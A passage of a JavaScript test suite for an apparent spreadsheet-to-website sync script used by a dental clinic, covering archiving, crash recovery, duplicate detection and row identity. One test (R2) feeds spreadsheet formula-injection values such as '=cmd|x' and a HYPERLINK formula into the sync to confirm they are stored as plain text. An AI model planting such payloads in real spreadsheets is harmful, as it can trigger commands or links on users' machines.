  w.server.addPatient({ mr: '50001', name: 'Check One', phone: '03001110301' });
  w.server.editCheckup(c1.id, { patient_mr: '50001', day_status: 'completed' });
  w.server.editCheckup(c2.id, { day_status: 'cancelled' });
  w.env.ticks(2);
  assert.equal(cellOf(w.env, GUL, 2, 'mr'), '50001', 'the Mr# was written into the row');
  w.env.at(TODAY, '23:58'); w.env.ticks(1);
  w.env.at(NEXT, '00:05'); w.env.ticks(1);
  const ck = ckSheet(w.env);
  assert.deepEqual(ck.values().slice(1).map((r) => r[1]), ['Check One'], 'the registered checkup is listed, the cancelled one is not');
});

test('K9: a crash between the copy to the archive and the marker (or in the middle of the marker) never copies the day twice, and a damaged marker is not trusted', () => {
  const crashOn = (env, test) => {
    const PS = env.sandbox.PropertiesService, orig = PS.getDocumentProperties;
    PS.getDocumentProperties = () => { const p = orig(); const set = p.setProperty; p.setProperty = (k, v) => { if (test(String(k))) throw new Error('Service error: Properties'); return set.call(p, k, v); }; return p; };
    return () => { PS.getDocumentProperties = orig; };
  };
  // (a) the whole marker fails to save: the rows are in the archive, nothing is cleared, no marker
  const a = dayEnd();
  a.env.at(NEXT, '00:05');
  const undoA = crashOn(a.env, (k) => k.startsWith('arch:' + GUL));
  a.env.ticks(1);
  assert.equal(archiveSheet(a.env).used().rows, 8, 'copied once');
  assert.equal(dataCells(a.env).length, 7, 'not cleared');
  undoA();
  a.env.ticks(1);
  assert.equal(archiveSheet(a.env).used().rows, 8, 'the retry did not copy the day again');
  assert.equal(dataCells(a.env).length, 0, 'and it finished: cleared');
  assert.equal(a.env.props.document.get('listDate:' + GUL), NEXT);
  // (b) the first chunk fails: the head is NOT written (chunks first, head last), so there is no marker that lies
  const b = dayEnd();
  b.env.at(NEXT, '00:05');
  const undoB = crashOn(b.env, (k) => k === 'arch:' + GUL + ':0');
  b.env.ticks(1);
  assert.equal(b.env.props.document.get('arch:' + GUL), undefined, 'no head without its chunks');
  assert.equal(b.env.props.document.get('listDate:' + GUL), TODAY, 'the day is not advanced');
  assert.equal(dataCells(b.env).length, 7, 'and nothing is cleared');
  undoB();
  b.env.ticks(1);
  assert.equal(archiveSheet(b.env).used().rows, 8);
  assert.equal(dataCells(b.env).length, 0);
  assert.equal(b.env.props.document.get('listDate:' + GUL), NEXT);
  // (c) a marker whose chunk is missing is read as "no marker": the tab is copied again (nothing twice) and cleared
  const c = dayEnd();
  c.env.at(NEXT, '00:05');
  const undoC = crashOn(c.env, (k) => k.startsWith('arch:' + GUL + ':'));
  c.env.ticks(1);
  undoC();
  c.env.props.document.set('arch:' + GUL, JSON.stringify({ date: TODAY, phase: 'copied', at: 1, chunks: 3 }));      // a head with chunks that are not there
  c.env.ticks(1);
  assert.equal(archiveSheet(c.env).used().rows, 8, 'not copied twice');
  assert.equal(dataCells(c.env).length, 0, 'cleared');
  assert.equal(c.env.props.document.get('listDate:' + GUL), NEXT, 'the day advanced only after the rows were copied and cleared');
  // identical rows are copied one by one, edited ones again
  assert.equal(env0Count(archiveSheet(c.env)), 7);
});
function env0Count(sheet) { let n = 0; for (let r = 2; r <= sheet.used().rows; r++) if (sheet.text(r, 3)) n++; return n; }

test('K13: rows that never reached the website are counted in the log when the archive goes ahead without it', () => {
  const { env, server } = dayEnd();
  env.responder = () => 'OK';
  env.typeRow(GUL, 9, ['', 'Typed At Midnight', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110977', '']);
  env.typeRow(GUL, 10, ['', 'Typed At Midnight Two', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110978', '']);
  server.faults.down = 1000;
  env.at(NEXT, '02:31');
  env.ticks(1);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT, 'the archive went ahead');
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /2 of the 9 rows of 2026-10-09 never reached the website \(the last sync did not go through\)\. They are in the archive: Admin > Import can bring them back\./);
});

test('loop 6 (minor): rows that still needed attention at midnight (a typo Mr#, "add the Mr#") are named in the log when they are archived, even though the last sync went through', () => {
  const { env, server } = dayEnd();
  env.typeRow(GUL, 9, ['60001', 'Typo Midnight', '', 'RCT', '', 'Waiting', '', '', '', '', '', '03001110979', '']);
  env.typeRow(GUL, 10, ['', 'Forgot Mr Midnight', '', 'Scaling', '', 'Waiting', '', '', '', '', '', '03001110980', '']);
  env.at(NEXT, '00:05');       // the final flush sends them (the website refuses both), then the day is archived
  env.ticks(1);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT, 'the archive went ahead');
  const log = env.tab('Aaj Sync log').values().map((r) => r.join(' | ')).join('\n');
  assert.match(log, /Typo Midnight \| Archived without reaching the website \(the row still needed attention\)\. It is in the archive under 2026-10-09/);
  assert.match(log, /Forgot Mr Midnight \| Archived without reaching the website/);
  assert.doesNotMatch(log, /Website Walker \| Archived without/, 'a row that is on the website is not listed');
  assert.ok(server.state.visits.length > 0);
});

test('K11: Lahore and Islamabad keep kit and material text in the Token column: the website never fills a blank Token cell there, not even on a row it adds; Gulshan still gets its number', () => {
  const mk = (mr, name, phone) => [mr, name, '', 'Monthly', '', 'Waiting', '', '', '', '', '', phone, ''];
  const { env, server } = world({ tabs: ['Gulberg Lhr', 'Islamabad', GUL], patients: ALL_PATIENTS,
    rows: { 'Gulberg Lhr': [mk('9721', 'Sample Person Eleven', '03001110011')], 'Islamabad': [mk('9731', 'Sample Person Fourteen', '03001110014')], [GUL]: [mk('9701', 'Sample Person One', '03001110001')] } });
  settle(env, 4);
  const tok = (tab, name) => cellOf(env, tab, rowOf(env, tab, name), 'token');
  assert.ok(webVisit(server, 'Sample Person Eleven').token && webVisit(server, 'Sample Person Fourteen').token, 'the website numbered both visits');
  assert.equal(tok('Gulberg Lhr', 'Sample Person Eleven'), '', 'Lahore: the cell stays blank');
  assert.equal(tok('Islamabad', 'Sample Person Fourteen'), '', 'Islamabad: the cell stays blank');
  assert.equal(tok(GUL, 'Sample Person One'), String(webVisit(server, 'Sample Person One').token), 'Gulshan: a blank Token cell is filled');
  // the website changes the number later: still not written there
  server.editVisit(webVisit(server, 'Sample Person Eleven').id, { token: 33 });
  env.ticks(2);
  assert.equal(tok('Gulberg Lhr', 'Sample Person Eleven'), '');
  // a website-only visit added to the Lahore tab comes without a token number
  server.addVisit({ branch: 'LHR', date: TODAY, mr: '9722', status: 'waiting', token: 5 });
  env.ticks(2);
  const r = rowOf(env, 'Gulberg Lhr', 'Sample Person Thirteen');
  assert.ok(r > 2, 'the row was added');
  assert.equal(cellOf(env, 'Gulberg Lhr', r, 'token'), '');
  // a number or kit text typed there is the sheet's own and still goes to the website
  setCell(env, 'Gulberg Lhr', rowOf(env, 'Gulberg Lhr', 'Sample Person Eleven'), 'token', 'Kit 80k');
  env.tickAfter(61000);
  assert.equal(cellOf(env, 'Gulberg Lhr', rowOf(env, 'Gulberg Lhr', 'Sample Person Eleven'), 'token'), 'Kit 80k');
  quiet(env, server);
});

test('K12: a typed edit fires on-edit AND on-change: on-change ignores EDIT (the on-edit run already marked it) but still notices a deleted, inserted or moved row', () => {
  const { env } = synced();
  env.ticks(3);
  const doc = env.props.document;
  assert.equal(doc.get('dirty'), undefined, 'a quiet sheet');
  const rteKey = [...doc.keys()].find((k) => k.startsWith('rte:'));
  env.ctx.aajOnChange({ changeType: 'EDIT', source: env.book });
  assert.equal(doc.get('dirty'), undefined, 'EDIT: nothing marked, no run time counted');
  assert.equal([...doc.keys()].find((k) => k.startsWith('rte:')), rteKey);
  env.ctx.aajOnChange({ changeType: 'FORMAT', source: env.book });
  assert.equal(doc.get('dirty'), undefined, 'FORMAT: nothing either');
  env.ctx.aajOnChange({ changeType: 'REMOVE_ROW', source: env.book });
  assert.ok(doc.get('dirty'), 'a deleted row is noticed');
  doc.delete('dirty');
  env.ctx.aajOnChange({ changeType: 'INSERT_ROW', source: env.book });
  assert.ok(doc.get('dirty'), 'an inserted row is noticed');
  doc.delete('dirty');
  env.ctx.aajOnChange({ changeType: 'OTHER', source: env.book });
  assert.ok(doc.get('dirty'), 'a sort or a paste of whole rows is noticed');
  doc.delete('dirty');
  setCell(env, GUL, 2, 'treatment details', 'typed');
  assert.ok(doc.get('dirty'), 'and a typed edit is marked by aajOnEdit');
});

test('R2: the website\'s list is data, not instructions: a visit with a key the sync did not make (a formula, a made-up key) is never added to the sheet, and nothing becomes a formula', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  const rowsBefore = sh.used().rows;
  const orig = env.fetchHandler;
  env.fetchHandler = (req) => {
    const r = orig(req);
    const body = JSON.parse(r.body);
    for (const t of body.tabs || []) {
      if (!t.visits || !t.visits.length) continue;
      const base = t.visits[0];
      t.visits.push({ ...base, key: 'W-=HYPERLINK("http://example.invalid","x")', id: 'bad-1', name: 'Formula Key', mr: '' },
        { ...base, key: 'W-NOTAUUID', id: 'bad-2', name: 'Made Up Key', mr: '' }, { ...base, key: '=cmd|x', id: 'bad-3', name: 'Restore Formula', mr: '', kind: 'checkup' });
      t.removed = [...(t.removed || []), { key: '=cmd|x', action: 'restore', message: 'Not removed: this checkup is already a patient, or has follow-up notes on the website.' }];
    }
    return { code: r.code, body: JSON.stringify(body) };
  };
  server.editVisit(webVisit(server, 'Sample Person One').id, { details: 'changed so the list comes back' });
  env.ticks(4);
  assert.equal(sh.used().rows, rowsBefore, 'no row was added for the strange keys, then or later (no row per minute)');
  assert.equal(env.stats.formulaWrites, 0, 'nothing was written as a formula');
  for (let r = 1; r <= sh.used().rows; r++) for (let c = 1; c <= sh.used().cols; c++) assert.ok(!/HYPERLINK|NOTAUUID|cmd\|x/.test(sh.text(r, c)), `cell ${r},${c}`);
  // a good key from the same list is still added
  server.addPatient({ mr: '9890', name: 'Good Key Person', phone: '03001110890' });
  server.addVisit({ branch: 'GUL', date: TODAY, mr: '9890', status: 'waiting' });
  env.ticks(3);
  assert.ok(rowOf(env, GUL, 'Good Key Person'), 'a real website visit is still added');
  // defence in depth: even a row that reached the writer with a formula in its key, base or status is written as text
  const st = env.ctx.aajSafeText_('=1+1');
  assert.equal(st, "'=1+1");
  const ctx = env.ctx.aajNewCtx_(env.ctx.aajLoadState_(), true);
  const e = { cfg: { tab: GUL, branch: 'GUL' }, sheet: sh };
  env.ctx.aajReadTab_(e);
  e.scan = env.ctx.aajScanTab(e.grid, e.cols, e.hc, Date.now(), TODAY, { newKey: env.ctx.aajNewKey_, branch: 'GUL' });
  env.ctx.aajApply_(ctx, e, { writes: [], helper: {}, status: {}, appends: [{ key: '=1+1', cells: { name: 'Direct Call' }, base: '=2+2', status: '=3+3', level: 'ok', patient: 'Direct Call' }] });
  assert.equal(env.stats.formulaWrites, 0, 'nothing became a formula');
  const rd = rowOf(env, GUL, 'Direct Call');
  assert.ok(rd > 1, 'the row was written');
  assert.equal(sh.text(rd, colOf(env, GUL, 'sync key')), '=1+1');
  assert.equal(sh.text(rd, colOf(env, GUL, 'sync base')), '=2+2');
  assert.equal(sh.text(rd, colOf(env, GUL, 'website')), '=3+3');
});

test('K7: the same checkup patient typed in two rows (same name and phone, no Mr# to tell them by): the second row is refused as a duplicate (RV-1), and deleting the first lets it take over the checkup; two people with no phone are not guessed', () => {
  const rows = [
    ['', 'Twin Checkup', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110555', ''],
    ['', 'Twin Checkup', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '0300 1110555', ''],
    ['', 'Other Person', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110556', ''],
    ['', 'No Phone', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '', ''],
    ['', 'No Phone', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '', ''],
  ];
  const { env, server } = world({ rows: { [GUL]: rows } });
  settle(env, 3);
  assert.equal(server.state.checkups.length, 4, 'one checkup for the two Twin rows (sheet-behaviour RV-1: before, two)');
  assert.equal(statusOf(env, GUL, 2), '\u2713 Checkup patient: no Mr#, no patient file.');
  assert.equal(statusOf(env, GUL, 3), '\u2717 Already on this list in row 2 (the same checkup patient). Delete this row. If this is another person, correct the name or the phone.');
  assert.equal(statusOf(env, GUL, 4), '\u2713 Checkup patient: no Mr#, no patient file.');
  assert.equal(statusOf(env, GUL, 5), '\u2713 Checkup patient: no Mr#, no patient file.');
  assert.equal(statusOf(env, GUL, 6), '\u2713 Checkup patient: no Mr#, no patient file.', 'no phone: never guessed to be the same person');
  assert.equal(server.state.checkups.filter((c) => c.name === 'No Phone').length, 2);
  assert.match(headerOf(env, GUL), /1 need attention/);
  const twin = server.state.checkups.find((c) => c.name === 'Twin Checkup');
  env.deleteRows(GUL, 2);                                       // staff delete the first row: the refused one takes over its checkup
  env.ticks(2);
  assert.equal(server.state.checkups.length, 4, 'nothing removed, nothing made');
  assert.equal(server.checkupById(twin.id), twin);
  assert.equal(twin.sheet_key, env.tab(GUL).text(2, colOf(env, GUL, 'sync key')));
  assert.equal(statusOf(env, GUL, 2), '\u2713 On website');
  assert.match(headerOf(env, GUL), /^Website \u00b7 \d\d:\d\d \u2713$/);
});

test('K7: two checkups of the same name and phone made on the website are flagged on both rows; the warning stays through quiet minutes; deleting one row clears it on the other', () => {
  const rows = [['', 'Other Person', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110556', '']];
  for (let i = 0; i < 4; i++) rows.push(['', 'Filler ' + (i + 1), '', 'Checkup', '', 'Waiting', '', '', '', '', '', '0300111060' + i, '']);
  const { env, server } = world({ rows: { [GUL]: rows } });
  settle(env, 3);
  server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Twin Checkup', phone: '03001110555', checkup_for: 'Checkup' });
  server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Twin Checkup', phone: '0300-1110555', checkup_for: 'Checkup' });
  env.ticks(3);
  const WARN = '\u26a0 Same checkup patient twice on today\'s list (same name and phone). Delete one of the rows.';
  const at = rowsNamed(env, GUL, 'Twin Checkup');
  assert.equal(at.length, 2);
  assert.equal(statusOf(env, GUL, at[0]), WARN);
  assert.equal(statusOf(env, GUL, at[1]), WARN);
  assert.match(headerOf(env, GUL), /2 need attention/);
  env.ticks(3);                                                // quiet minutes (the website sends no list)
  assert.equal(statusOf(env, GUL, at[0]), WARN, 'the warning stays through quiet minutes');
  server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Unrelated Walk', phone: '03001110999', checkup_for: 'Checkup' });
  env.ticks(3);                                                // a new list arrives
  assert.equal(statusOf(env, GUL, at[0]), WARN, 'and through the next lists');
  assert.equal(statusOf(env, GUL, at[1]), WARN);
  env.deleteRows(GUL, at[1]);
  env.ticks(2);
  assert.equal(server.state.checkups.filter((c) => c.name === 'Twin Checkup').length, 1, 'the deleted row\'s checkup is gone from the website');
  assert.equal(statusOf(env, GUL, at[0]), '\u2713 On website', 'and the other row is no longer flagged');
  assert.match(headerOf(env, GUL), /^Website \u00b7 \d\d:\d\d \u2713$/);
});

// ------------------------------------------------------------------------------------------------ loop 3 (2026-10-10): the skeptic's L1, L5, L6, L7
/** writes visible cells the way a person's sort of the visible columns leaves them (a leading-0 phone stays text) */
function putVisible(sh, r, cells) {
  cells.forEach((v, c) => { sh._set(r, c + 1, v === '' ? null : { kind: /^[1-9]\d*$/.test(v) ? 'n' : 's', v: /^[1-9]\d*$/.test(v) ? Number(v) : v }); });
}

test('L1: checkup rows sorted with only the visible columns (hidden keys left behind) are not renamed into each other: every checkup keeps its own person and notes', () => {
  const people = [['Amna Ck', '03001110401'], ['Bushra Ck', '03001110402'], ['Fiza Ck', '03001110403'], ['Hira Ck', '03001110404']];
  const rows = people.map(([n, p]) => ['', n, '', 'Checkup', '', 'Waiting', '', '', '', '', '', p, '']);
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  assert.equal(server.state.checkups.length, 4);
  for (const c of server.state.checkups) server.editCheckup(c.id, { follow_up: 'Called: ' + c.name });      // the front desk's follow-up on the website
  env.ticks(1);
  const idOf = Object.fromEntries(server.state.checkups.map((c) => [c.name, c.id]));
  const sh = env.tab(GUL);
  const kc = colOf(env, GUL, 'website');
  const vis = [2, 3, 4, 5].map((r) => sh.row(r).slice(0, kc - 1)).reverse();
  [2, 3, 4, 5].forEach((r, i) => putVisible(sh, r, vis[i]));
  env.touch();
  env.advance(61000);
  env.ticks(4);
  assert.equal(server.state.checkups.length, 4, 'no checkup made, none lost');
  for (const c of server.state.checkups) assert.equal(c.follow_up, 'Called: ' + c.name, `${c.name}: the follow-up notes stay with the person they were written for`);
  for (const [n, p] of people) {
    const c = server.checkupById(idOf[n]);
    assert.equal(c.name, n, 'the checkup was not renamed to the person now in its old row');
    assert.equal(c.phone, p);
    assert.equal(cellOf(env, GUL, rowOf(env, GUL, n), 'sync key'), c.sheet_key, `${n}'s row is linked to ${n}'s own checkup`);
  }
  quiet(env, server);
});

test('L1: a checkup row typed over with another person (another name and phone) is a new row: the first checkup keeps its person', () => {
  const { env, server } = ckWorld();
  const c = server.state.checkups.find((x) => x.name === 'Check One');
  server.editCheckup(c.id, { follow_up: 'Called once' });
  env.ticks(1);
  setCell(env, GUL, 2, 'patient', 'Zara Newcomer');
  setCell(env, GUL, 2, 'contact', '03009998888');
  env.advance(61000);
  env.ticks(3);
  assert.equal(c.name, 'Check One', 'the first checkup was not renamed');
  assert.equal(c.phone, '03001110301');
  const z = server.state.checkups.find((x) => x.name === 'Zara Newcomer');
  assert.ok(z, 'the new person has a checkup of their own');
  assert.equal(z.phone, '03009998888');
  assert.equal(cellOf(env, GUL, 2, 'sync key'), z.sheet_key);
  assert.equal(z.follow_up, 'Not Contacted', "and none of the first person's follow-up");
  assert.ok(rowOf(env, GUL, 'Check One'), "the first person's checkup has follow-up notes, so the website keeps it and its row comes back");
});

test('L5: a column the staff added to the right of the helper columns ("Staff notes") is copied to the archive before the midnight clear', () => {
  const { env } = dayEnd();
  const sh = env.tab(GUL);
  const last = sh.used().cols;
  sh.maxCols = Math.max(sh.maxCols, last + 3);
  sh._set(1, last + 1, { kind: 's', v: 'Staff notes' });
  sh._set(2, last + 1, { kind: 's', v: 'called twice' });
  sh._set(5, last + 1, { kind: 's', v: 'bring the x-ray' });
  env.at(NEXT, '00:05');
  env.ticks(1);
  const arch = archiveSheet(env);
  const hcol = arch.row(1).indexOf('Staff notes');
  assert.ok(hcol >= 0, 'the archive has the staff column: ' + arch.row(1).join(' | '));
  const notes = [];
  for (let r = 2; r <= arch.used().rows; r++) if (arch.text(r, hcol + 1)) notes.push(arch.text(r, hcol + 1));
  assert.deepEqual(notes.sort(), ['bring the x-ray', 'called twice'], 'both notes are in the archive');
  for (let r = 2; r <= 12; r++) assert.equal(sh.text(r, last + 1), '', 'and the tab is cleared');
  assert.equal(sh.text(1, last + 1), 'Staff notes', 'the header stays');
  assert.ok(!arch.row(1).some((h) => /^Sync |^Website ·/.test(h)), 'the helper columns are not archived');
});

test('L6: "checkup" is the word checkup only (the same pattern as the database); a row with a Month is never put on the nightly checkup list', () => {
  const env = createEnv();
  const yes = ['Checkup', 'checkup / pain', 'Xray checkup', 'Check up', 'CHECK-UP', 'chek up', 'Checkups', 'checup', 'Consultation checkup'];
  const no = ['Wire check', 'Braces check', 'Retainer check', 'RCT check', 'Post op check', 'Check wire', 'Cheek filler', 'Check upper wire', 'Filling & Crown prep', 'Monthly', '', null];
  for (const t of yes) assert.equal(env.call('aajIsCheckupText', t), true, t);
  for (const t of no) assert.equal(env.call('aajIsCheckupText', t), false, String(t));
  const sql = fs.readFileSync(new URL('../supabase/migrations/20261009000300_aaj_two_way_sync.sql', import.meta.url), 'utf8');
  assert.ok(sql.includes(String.raw`~* '\mch[ea]{1,2}c?k?[- ]?ups?\M'`), 'the database has the same pattern (its word edges are written \\m and \\M)');
  assert.ok(fs.readFileSync(SCRIPT_PATH, 'utf8').includes(String.raw`/\bch[ea]{1,2}c?k?[- ]?ups?\b/i`), 'and the script uses it');
  const header = fixture.headers[GUL];
  const s = { cfg: { tab: GUL, branch: 'GUL' }, cols: env.call('aajDetectColumns', header) };
  const row = (name, month, treatment) => {
    const cells = header.map(() => '');
    cells[s.cols.name] = name; cells[s.cols.month] = month; cells[s.cols.treatment] = treatment; cells[s.cols.status] = 'Completed';
    return { cells, key: '', visit: '', checkup: false };
  };
  const lines = env.call('aajCheckupLines', s, [row('Plain Checkup', '', 'Checkup'), row('Wire Forgot', '6', 'Wire check'), row('Month Checkup', '04 Photo', 'Checkup'), row('Cheek Person', '', 'Cheek filler')], TODAY);
  assert.deepEqual(lines.map((l) => l.name), ['Plain Checkup'], 'only the real checkup goes to the nightly list');
});

test('L7: a website visit that was cancelled on the website and whose row staff then deleted is not added back when the website list changes', () => {
  const { env, server } = synced();
  server.addPatient({ mr: '9796', name: 'Cancel Later', phone: '03001110096' });
  const v = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9796', status: 'waiting' });
  env.ticks(2);
  const r = rowOf(env, GUL, 'Cancel Later');
  assert.ok(r, 'added from the website');
  assert.equal(v.sheet_key, 'W-' + v.id, 'claimed');
  server.editVisit(v.id, { status: 'cancelled' });
  env.ticks(1);
  assert.equal(cellOf(env, GUL, r, 'waiting'), 'Cancelled');
  env.deleteRows(GUL, r);
  env.ticks(2);
  assert.equal(rowOf(env, GUL, 'Cancel Later'), null, 'gone from the sheet');
  server.addPatient({ mr: '9795', name: 'Next Walker', phone: '03001110095' });
  server.addVisit({ branch: 'GUL', date: TODAY, mr: '9795', status: 'waiting' });      // the website's list changes
  env.ticks(2);
  assert.ok(rowOf(env, GUL, 'Next Walker'), 'the new website visit is added');
  assert.equal(rowOf(env, GUL, 'Cancel Later'), null, 'the cancelled one whose row was deleted is not added back');
  assert.equal(server.visitById(v.id).status, 'cancelled', 'and it stays on the website, cancelled');
  quiet(env, server);
});

// ------------------------------------------------------------------------------------------------ loop 4 (2026-10-10): row identity (sheet-behaviour B1, B2, B4)
test('B1: two checkups with the SAME first name sorted with only the visible columns are not swapped: each keeps its own person, phone and notes', () => {
  const people = [['Ali Raza', '03001110502'], ['Ali Khan', '03001110501'], ['Sana Butt', '03001110503']];
  const rows = people.map(([n, p]) => ['', n, '', 'Checkup', '', 'Waiting', '', '', 'det ' + n, '', '', p, '']);
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  assert.equal(server.state.checkups.length, 3);
  for (const c of server.state.checkups) server.editCheckup(c.id, { follow_up: 'Called: ' + c.name });
  env.ticks(1);
  const idOf = Object.fromEntries(server.state.checkups.map((c) => [c.name, c.id]));
  const sh = env.tab(GUL);
  const kc = colOf(env, GUL, 'website');
  const nc = colOf(env, GUL, 'patient') - 1;
  const vis = [2, 3, 4].map((r) => sh.row(r).slice(0, kc - 1)).sort((a, b) => String(a[nc]).localeCompare(String(b[nc])));
  [2, 3, 4].forEach((r, i) => putVisible(sh, r, vis[i]));
  assert.equal(sh.text(2, nc + 1), 'Ali Khan', "the sort moved Ali Khan onto Ali Raza's hidden key");
  env.touch();
  env.advance(61000);
  env.ticks(5);
  assert.equal(server.state.checkups.length, 3, 'no checkup made, none lost');
  for (const [n, p] of people) {
    const c = server.checkupById(idOf[n]);
    assert.equal(c.name, n, 'the checkup was not renamed to the other Ali');
    assert.equal(c.phone, p);
    assert.equal(c.details, 'det ' + n);
    assert.equal(c.follow_up, 'Called: ' + n, 'the notes stay with their own person');
    assert.equal(cellOf(env, GUL, rowOf(env, GUL, n), 'sync key'), c.sheet_key, n + "'s row is linked to their own checkup");
  }
  quiet(env, server);
});

test('B1: a checkup row typed over with a person of the SAME first name and another phone is a new checkup: the first person keeps her checkup, notes and place on the nightly list', () => {
  const rows = [['', 'Fatima Saleem', '', 'Checkup', '', 'Waiting', '', '', 'wants braces quote', '', '', '03001110601', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  const c = server.state.checkups.find((x) => x.name === 'Fatima Saleem');
  server.editCheckup(c.id, { follow_up: 'Interested' });
  env.ticks(1);
  setCell(env, GUL, 2, 'patient', 'Fatima Javed');
  setCell(env, GUL, 2, 'contact', '03001110602');
  env.advance(61000);
  env.ticks(3);
  assert.equal(c.name, 'Fatima Saleem', 'the first checkup was not renamed');
  assert.equal(c.phone, '03001110601');
  assert.equal(c.follow_up, 'Interested');
  assert.equal(c.details, 'wants braces quote');
  const j = server.state.checkups.find((x) => x.name === 'Fatima Javed');
  assert.ok(j, 'the new person has a checkup of her own');
  assert.equal(j.phone, '03001110602');
  assert.equal(j.follow_up, 'Not Contacted');
  assert.equal(cellOf(env, GUL, 2, 'sync key'), j.sheet_key);
  assert.ok(rowOf(env, GUL, 'Fatima Saleem'), 'Fatima Saleem has follow-up notes, so the website keeps her and her row comes back');
});

test('B2: a checkup row sorted onto the hidden key of a visit whose patient has the same first name does not overwrite the visit; nothing is deleted and nobody is told to delete the right row', () => {
  const rows = [
    ['', 'Ali Raza', '', 'Checkup', '', 'Waiting', '', '', 'pain upper left', '', '', '03001119999', ''],
    ['9711', 'Ali Khan', '', 'RCT', '', 'Treatment', '', '', 'RCT 36 second sitting', '', '', '', ''],
  ];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: [{ mr: '9711', name: 'Ali Khan', phone: null }] });
  settle(env, 3);
  const v = webVisit(server, 'Ali Khan');
  const ck = server.state.checkups.find((x) => x.name === 'Ali Raza');
  assert.ok(v && ck);
  assert.equal(v.status, 'in_treatment');
  const sh = env.tab(GUL);
  const kc = colOf(env, GUL, 'website');
  const vis = [2, 3].map((r) => sh.row(r).slice(0, kc - 1)).reverse();      // sorted by Mr#, largest first: the empty Mr# goes last
  [2, 3].forEach((r, i) => putVisible(sh, r, vis[i]));
  env.touch();                     // a sort fires on-change only
  env.advance(61000);
  env.ticks(6);
  assert.equal(v.treatment_label, 'RCT', 'the visit kept its Treatment');
  assert.equal(v.status, 'in_treatment', 'and its status');
  assert.equal(v.details, 'RCT 36 second sitting');
  assert.ok(server.checkupById(ck.id), 'the checkup is still on the website');
  assert.equal(server.checkupById(ck.id).details, 'pain upper left');
  assert.equal(server.state.removedLog.length, 0, 'nothing was removed');
  assert.equal(cellOf(env, GUL, rowOf(env, GUL, 'Ali Khan'), 'sync key'), server.visitById(v.id).sheet_key, "Ali Khan's row is his visit");
  assert.equal(cellOf(env, GUL, rowOf(env, GUL, 'Ali Raza'), 'sync key'), server.checkupById(ck.id).sheet_key, "Ali Raza's row is the checkup");
  assert.equal(cellOf(env, GUL, rowOf(env, GUL, 'Ali Raza'), 'mr'), '', 'no Mr# was written into the checkup row');
  for (const r of [2, 3]) assert.equal(statusOf(env, GUL, r), '✓ On website', 'row ' + r);
  quiet(env, server);
});

test('B2: an Mr# cleared by mistake on a visit row (same name) keeps the row on its visit; the website writes the Mr# back', () => {
  const { env, server } = synced();
  const r = rowOf(env, GUL, 'Sample Person Two');
  const key = cellOf(env, GUL, r, 'sync key');
  const n = server.state.visits.length;
  setCell(env, GUL, r, 'mr', '');
  env.advance(61000);
  env.ticks(3);
  assert.equal(cellOf(env, GUL, r, 'sync key'), key, 'same key');
  assert.equal(server.state.visits.length, n, 'no visit made or removed');
  assert.equal(cellOf(env, GUL, r, 'mr'), '146', 'the Mr# came back');
  assert.equal(server.state.removedLog.length, 0);
});

test('B4: front desk registers a checkup patient on the website and staff type the new Mr# into the row before the sync writes it: no visit, no second row', () => {
  const { env, server } = ckWorld();
  const c = server.state.checkups.find((x) => x.name === 'Check One');
  server.addPatient({ mr: '50020', name: 'Check One', phone: '03001110301' });
  server.editCheckup(c.id, { patient_mr: '50020' });
  setCell(env, GUL, 2, 'mr', '50020');
  env.advance(61000);
  env.ticks(4);
  assert.equal(server.state.visits.length, 0, 'no visit for the registered checkup');
  assert.equal(server.state.checkups.length, 2);
  assert.equal(env.tab(GUL).used().rows, 3, 'no row was added back');
  assert.equal(cellOf(env, GUL, 2, 'sync key'), c.sheet_key);
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
  assert.equal(cellOf(env, GUL, 2, 'mr'), '50020');
  quiet(env, server);
});

// ------------------------------------------------------------------------------------------------ loop 5 (2026-10-10): row identity (RS5-1) and lost keys (RS5-2)
const ckRow = (name, phone, treatment = 'Checkup', details = '') => ['', name, '', treatment, '', 'Waiting', '', '', details, '', '', phone, ''];

test('RS5-1: a checkup row typed over one cell at a time (the name, a tick, then the phone) never renames the first checkup', () => {
  const { env, server } = world({ rows: { [GUL]: [ckRow('First Person', '03001110701')] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const c = server.state.checkups.find((x) => x.name === 'First Person');
  server.editCheckup(c.id, { follow_up: 'Interested' });
  env.ticks(1);
  setCell(env, GUL, 2, 'patient', 'Second Person');
  env.tickAfter(20000);                       // the row is still being typed in (edited 20 s ago)
  assert.equal(c.name, 'First Person', 'the name alone did not rename the checkup');
  env.advance(15000);
  setCell(env, GUL, 2, 'contact', '03001110799');
  env.tickAfter(5000);
  env.advance(61000);
  env.ticks(4);
  assert.equal(c.name, 'First Person');
  assert.equal(c.phone, '03001110701');
  assert.equal(c.follow_up, 'Interested', 'her follow-up stays hers');
  const s = server.state.checkups.find((x) => x.name === 'Second Person');
  assert.ok(s && s.id !== c.id, 'the second person has a checkup of her own');
  assert.equal(s.phone, '03001110799');
  assert.equal(cellOf(env, GUL, 2, 'sync key'), s.sheet_key);
  assert.ok(rowOf(env, GUL, 'First Person'), 'the first person has follow-up notes: the website keeps her and her row comes back');
});

test('RS5-1: a person with the SAME first name typed over a checkup row (the name, a tick while the row is busy, then the phone) is a new checkup; the first keeps hers', () => {
  const { env, server } = world({ rows: { [GUL]: [ckRow('Fatima Saleem', '03001110601', 'Checkup', 'wants braces quote')] }, patients: BASE_PATIENTS });
